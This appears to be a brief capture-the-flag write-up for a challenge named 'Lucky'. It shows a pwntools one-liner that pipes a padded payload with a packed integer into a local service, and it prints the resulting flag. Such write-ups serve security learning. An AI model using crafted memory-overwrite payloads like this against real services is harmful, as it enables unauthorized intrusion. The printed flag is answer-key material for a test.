# Lucky
## Description
Feeling lucky? I have just the challenge for you :D

## Solution
```text
❯ python -c "from pwn import *;import sys; sys.stdout.buffer.write(b'A' * 12 + p32(0x563412))" | nc 127.0.0.1 7001
Enter your name: 
Welcome, AAAAAAAAAAAA4V
If you're super lucky, you might get a flag! GLHF :D
Nice work! Here's the flag: gigem{un1n1t14l1z3d_m3m0ry_15_r4nd0m_r1ght}
```
